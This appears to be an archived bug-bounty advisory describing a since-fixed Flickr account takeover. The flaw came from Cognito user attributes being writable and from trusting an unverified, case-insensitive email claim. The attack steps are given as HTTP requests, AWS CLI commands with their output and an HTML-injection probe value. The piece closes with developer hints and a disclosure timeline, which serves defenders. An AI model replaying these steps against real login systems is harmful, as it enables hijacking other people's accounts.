---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-12-18_flickr-account-takeover.md
original_filename: 2021-12-18_flickr-account-takeover.md
title: Flickr Account Takeover
category: documents
detected_topics:
- sso
- oauth
- access-control
- command-injection
- mfa
- otp
tags:
- imported
- documents
- sso
- oauth
- access-control
- command-injection
- mfa
- otp
language: en
raw_sha256: 9838f7c71a3ab111394dfe0ba71358c89b8b04cfd1e5f1ad513b584b88870644
text_sha256: 1d7232f7ed5598eabc680cce0e4efdec440dee3db9abff2753d39ec525712046
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# Flickr Account Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-12-18_flickr-account-takeover.md
- Source Type: markdown
- Detected Topics: sso, oauth, access-control, command-injection, mfa, otp
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `9838f7c71a3ab111394dfe0ba71358c89b8b04cfd1e5f1ad513b584b88870644`
- Text SHA256: `1d7232f7ed5598eabc680cce0e4efdec440dee3db9abff2753d39ec525712046`


## Content

---
title: "Flickr Account Takeover"
page_title: "(Web-)Insecurity Blog | Flickr Account Takeover"
url: "https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/"
final_url: "https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/"
authors: ["Lauritz Holtmann (@_lauritz_)"]
programs: ["Flickr"]
bugs: ["Account takeover", "Broken authentication"]
bounty: "7,550"
publication_date: "2021-12-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3080
---

ADVISORIES December 18, 2021 8 min read 1685 words

This post gives a deep dive into a critical security flaw that was present in [Flickr](https://www.flickr.com/)’s login flow.

The authentication at [identity.flickr.com](https://identity.flickr.com/) is implemented using [AWS Cognito](https://aws.amazon.com/cognito/). By exploiting configuration issues and violations of the [OpenID Connect](https://openid.net/connect/) specification, it was possible to takeover any Flickr account without user interaction.

The issue was reported to Flickr via [HackerOne](https://hackerone.com/reports/1342088) on September 17th, the first preliminary fix was applied on that day.

* * *

## Table of Contents

  1. Flickr Login Flow
  2. Amazon Cognito
  3. OpenID Connect: Using an Unintended Claim for User Authentication
  4. Making Wrong Assumptions
  5. Assembling the Puzzle: Account Takeover
  6. Hints for Developers
  7. Hints for Security Researchers
  8. Responsible Disclosure Timeline

* * *

## Flickr Login Flow

Let us start by having a look at Flickr’s login. Flickr uses [Amazon Cognito](https://aws.amazon.com/de/cognito/) to implement its login functionality.

On a high level, the flow can be illustrated as follows:

![Flickr Login Flow](/images/advisories/flickr-login-flow.svg)

The flow is started at `identity.flickr.com`. Via JavaScript, the end-user’s credentials are sent to `cognito-idp.us-east-1.amazonaws.com`, which responds with _tokens_. Finally, these _tokens_ are forwarded to `www.flickr.com`.

### Amazon Cognito

The [Amazon Cognito](https://aws.amazon.com/de/cognito/) login implements a slightly modified variant of [OpenID Connect](https://openid.net/connect/). If you are familiar with this single sign-on protocol, you will recognize the following _Auth. Request_ and _Auth. Response_ :
  
  
  POST / HTTP/2
  Host: cognito-idp.us-east-1.amazonaws.com
  [...]
  
  {
  "AuthFlow":"USER_PASSWORD_AUTH",
  "ClientId":"3ck15a1ov4f0d3o97vs3tbjb52",
  "AuthParameters":{
  "USERNAME":"attacker@flickr.com",
  "PASSWORD":"[REDACTED]",
  "DEVICE_KEY":"us-east-1_070[...]"
  },
  "ClientMetadata":
  {  
  }
  }
  

If the provided credentials are valid, Cognito responds with tokens:
  
  
  HTTP/2 200 OK
  Date: Thu, 32 Abc 2040 25:51:36 GMT
  [...]
  
  {
  "AuthenticationResult":  
  {
  "AccessToken":"[REDACTED]",
  "ExpiresIn":3600,
  "IdToken":"[REDACTED]",
  "RefreshToken":"[REDACTED]",
  "TokenType":"Bearer"
  },
  "ChallengeParameters":
  {  
  }
  }
  

Included within the _Auth. Response_ is the `access_token` that should catch your attention.

Short research may lead to the realization, that this token can be directly used with the [AWS Command Line Interface](https://aws.amazon.com/cli/). But before we will have a look at the capabilities of this token, I would like to shame the AWS documentation on _Cognito_ and _User Pools_. Or at least its [German translation](https://docs.aws.amazon.com/de_de/cognito/latest/developerguide/token-revocation.html). It is simply not readable, after having a short glance into the localized version, I do not wonder anymore why developers tend to misconfigure or misuse these AWS APIs. 🙊

But now back to the topic: Flickr uses a _user pool_ to organize their users. By using the `access_token` with the [AWS CLI](https://aws.amazon.com/cli/) tool, we can test which [actions](https://docs.aws.amazon.com/cognito-user-identity-pools/latest/APIReference/API_Operations.html) are in the scope of our token.

Let us start with the simple [GetUser](https://docs.aws.amazon.com/cognito-user-identity-pools/latest/APIReference/API_GetUser.html) action, which only requires an `access_token`:
  
  
  $ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]
  {
  "Username": "e28[...]",
  "UserAttributes": [
  {
  "Name": "sub",
  "Value": "e28[...]"
  },
  {
  "Name": "birthdate",
  "Value": "1998-09-17"
  },
  {
  "Name": "email_verified",
  "Value": "true"
  },
  {
  "Name": "locale",
  "Value": "en-us"
  },
  {
  "Name": "given_name",
  "Value": "Peter"
  },
  {
  "Name": "family_name",
  "Value": "Pentest"
  },
  {
  "Name": "email",
  "Value": "xyz@flickr.com"
  }
  ]
  }
  

_Great!_ As the above output indicates, the obtained token can indeed be used to communicate with the AWS API.

Besides **reading** , we can also try to **write** user attributes (claims) that are linked to our account:
  
  
  $  aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQi[...] --user-attributes 'Name=birthdate,Value=><s>0'
  
  $  aws cognito-idp get-user --region us-east-1 --access-token eyJraWQi[...]
  {
  "Username": "e28[...]",
  "UserAttributes": [
  {
  "Name": "sub",
  "Value": "e28[...]"
  },
  {
  "Name": "birthdate",
  "Value": "><s>0"
  },
  [...]
  ]
  }
  

Again, this attempt was successful and we altered the registered claim. 🧐

So far for the basics. Until now, we saw that Flickr allowed to _read_ and _write_ user attributes of the internally used _AWS user pool_ using the API. This was our first puzzle piece.

### OpenID Connect: Using an Unintended Claim for User Authentication

We proceed with our exploration by fiddling around with the `email` user attribute. When we try to write this claim, we notice the following:
  
  
  $ aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
  {
  "CodeDeliveryDetailsList": [
  {
  "Destination": "i***@f***.com",
  "DeliveryMedium": "EMAIL",
  "AttributeName": "email"
  }
  ]
  }
  
  $ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQi[...] 
  {
  "Username": "e28c34[...]",
  "UserAttributes": [
  [...]
  {
  "Name": "email_verified",
  "Value": "false"
  },
  {
  "Name": "email",
  "Value": "imaginary@flickr.com"
  }
  ]
  }
  

Interestingly, we are able to write this claim. The only constraint appears to be that until the e-mail is verified using a sent _code_ , the `email_verified` is set to `false`.

By chance, I tried to authenticate using my account at this time and noticed, that the login flow was _broken_. Sadly I have no good screenshots from this state. To conclude my observations, Flickr appeared to use the `email` claim for authentication, and even worse, completely ignored the `email_verified` claim. After login, I was sent to a page that told me there was no linked account for the given e-mail address. 😯

To understand why this might be an issue, let us have a look at the [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html#IDToken) specification on the `sub` claim:

> […]
> 
> **sub**
> 
>  _REQUIRED_. Subject Identifier. A **locally unique** and **never reassigned** identifier within the Issuer for the End-User, which is intended to be consumed by the Client, e.g., 24400320 or AItOawmwtWwcT0k51BayewNvutrJUqsvl6qs7A4. It MUST NOT exceed 255 ASCII characters in length. The sub value is a **case sensitive** string.

This rather short excerpt includes some really important guarantees an _Authorization Server_ gives to its _Relying Parties_ that can be summed up as: You - as a client - can trust the contents within the `sub` to identify your users.

Strikingly, this guarantee does not exist at all for other claims, like the `email` claim. For instance, the AWS Cognito user attribute `email` is _case sensitive_ …

### Making Wrong Assumptions

During the login via [identity.flickr.com](https://identity.flickr.com/), Flickr _normalizes_ entered e-mail addresses and sends the entirely _lower case_ e-mail address to the backend. Server-side, the same normalization seems to take place before the `email` claim is interpreted. Therefore, Flickr seems to _assume_ that there will not be any collisions regarding e-mail addresses (e.g. _[Lauritz.Holtmann@example.com](mailto:Lauritz.Holtmann@example.com)_ vs. _[lauritz.holtmann@example.com](mailto:lauritz.holtmann@example.com)_).

But, as you already know, by directly tampering with the _user attributes_ via AWS CLI, we could easily create such a situation. 😳

### Assembling the Puzzle: Account Takeover

Now we have all information that we need to assemble the puzzle and to takeover any Flickr account (_of course this issue was immediately resolved, for more information seeResponsible Disclosure Timeline_).

Consider we have the following accounts:

  1. [victim@flickr.com](mailto:victim@flickr.com) (our victim)
  2. An arbitrary other account that is controlled by the attacker - in the following [attacker@flickr.com](mailto:attacker@flickr.com)

At first, the malicious actor needs to obtain an AWS _user pool_ `access_token`. To do so, intercept the login request that is sent from <https://identity.flickr.com/>:
  
  
  POST / HTTP/2
  Host: cognito-idp.us-east-1.amazonaws.com
  [...]
  
  {
  "AuthFlow":"USER_PASSWORD_AUTH",
  "ClientId":"3ck15a1ov4f0d3o97vs3tbjb52",
  "AuthParameters":{
  "USERNAME":"attacker@flickr.com",
  "PASSWORD":"[REDACTED]",
  "DEVICE_KEY":"us-east-1_070[...]"
  },
  "ClientMetadata":
  {  
  }
  }
  

If the provided credentials for the attacker-controlled account are valid, Amazon responds with tokens:
  
  
  HTTP/2 200 OK
  Date: Thu, 32 Abc 2040 25:51:36 GMT
  [...]
  
  {
  "AuthenticationResult":  
  {
  "AccessToken":"[REDACTED]",
  "ExpiresIn":3600,
  "IdToken":"[REDACTED]",
  "RefreshToken":"[REDACTED]",
  "TokenType":"Bearer"
  },
  "ChallengeParameters":
  {  
  }
  }
  

As seen before, the `access_token` can be directly used against the Amazon AWS API, for instance using the [AWS Command Line Interface](https://docs.aws.amazon.com/cli/) tool:
  
  
  $ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]
  {
  "Username": "e2[...]",
  "UserAttributes": [
  {
  "Name": "sub",
  "Value": "e28[...]"
  },
  {
  "Name": "birthdate",
  "Value": "1998-09-17"
  },
  {
  "Name": "email_verified",
  "Value": "true"
  },
  {
  "Name": "locale",
  "Value": "en-us"
  },
  {
  "Name": "given_name",
  "Value": "Peter"
  },
  {
  "Name": "family_name",
  "Value": "Pentest"
  },
  {
  "Name": "email",
  "Value": "attacker@flickr.com"
  }
  ]
  }
  

Using the API, one is able to alter some of the user attributes - including the linked e-mail address:
  
  
  $ aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=Victim@flickr.com
  {
  "CodeDeliveryDetailsList": [
  {
  "Destination": "V***@flickr.com",
  "DeliveryMedium": "EMAIL",
  "AttributeName": "email"
  }
  ]
  }
  

Note that the registered address is **case-sensitive**.

As the above output already indicates, at this stage, the e-mail address is not verified but set to a look-alike address of the victim:
  
  
  $ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQi[...] 
  {
  "Username": "e28c34[...]",
  "UserAttributes": [
  {
  "Name": "sub",
  "Value": "e2[...]"
  },
  {
  "Name": "birthdate",
  "Value": "1998-09-17"
  },
  {
  "Name": "email_verified",
  "Value": "false"
  },
  {
  "Name": "locale",
  "Value": "en-us"
  },
  {
  "Name": "given_name",
  "Value": "Peter"
  },
  {
  "Name": "family_name",
  "Value": "Pentest"
  },
  {
  "Name": "email",
  "Value": "Victim@flickr.com"
  }
  ]
  }
  

To complete the account takeover, login using the malicious, look-alike e-mail address and the attacker’s password.

In the following video, the complete process from the creation of an attacker account to login into the victim account is presented:

Your browser does not support the video tag.

Thus, chained, as shown above, the aforementioned issues can be used to takeover a user’s account without any user interaction.

## Hints for Developers

There are some takeaways and key issues identified in this post, that need to be considered if you use _Amazon Cognito_ or similar (OAuth / OpenID Connect based) Identity Providers:

  1. Do not rely on other claims than the `sub` (subject) claim.
  2. If you use _Amazon Cognito_ , evaluate if there is a need to enable users to directly fiddle around with their _user attributes_ using the AWS API. If not, [protect all other attributes](https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-attributes.html#user-pool-settings-attribute-permissions-and-scopes).
  3. If you use _Amazon Cognito_ , keep in mind that the `email` claim may hold an unverified e-mail address. The verification status of this claim is reflected by the `email_verified` claim.

## Hints for Security Researchers

Authentication, especially in case there are multiple entities like in single sign-on flows, is error-prone.

If you are interested in this kind of bug, besides having a detailed look at used primitives and technologies, always try to have an eye on the “high-level overview” of an authentication system. Especially where different products and software interact with each other, wrong assumptions are made and security-relevant bugs occur.

* * *

### Responsible Disclosure Timeline

  * **17th September 2021** : [LH] Initial Report via Hackerone: <https://hackerone.com/reports/1342088>
  * **17th Spetember 2021** : [FLICKR] After some clarification, Flickr staff asks for a proof for the described issue: ![Screenshot from H1 Triage](/images/advisories/flickr-h1.png)
  * **17th September 2021** : [FLICKR] Report is triaged, the maximal bounty is awarded.
  * **18th September 2021** : [FLICKR] A preliminary fix is applied to mitigate the immediate risk.
  * **18th December 2021** : [FLICKR] The Hackerone report is disclosed.
  * **18th December 2021** : [LH] This post is published.

The Responsible Disclosure process was exemplary, kudos to Flickr’s Application Security team! 🙂

* * *

Thank you for reading this post! If you have any feedback, feel free to reach out via [Mastodon](https://ruhr.social/@lauritz), [Twitter](https://twitter.com/_lauritz_) or [LinkedIn](https://linkedin.com/in/lauritz-holtmann). 👨‍💻

You can directly tweet about this post using [this link](https://twitter.com/intent/tweet?url=https%3A%2F%2Fsecurity.lauritz-holtmann.de%2Fadvisories%2Fflickr-account-takeover%2F&via=_lauritz_). 🤓

  * [OpenID Connect](/tags/openid-connect)
  * [Flickr](/tags/flickr)
  * [Amazon Cognito](/tags/amazon-cognito)
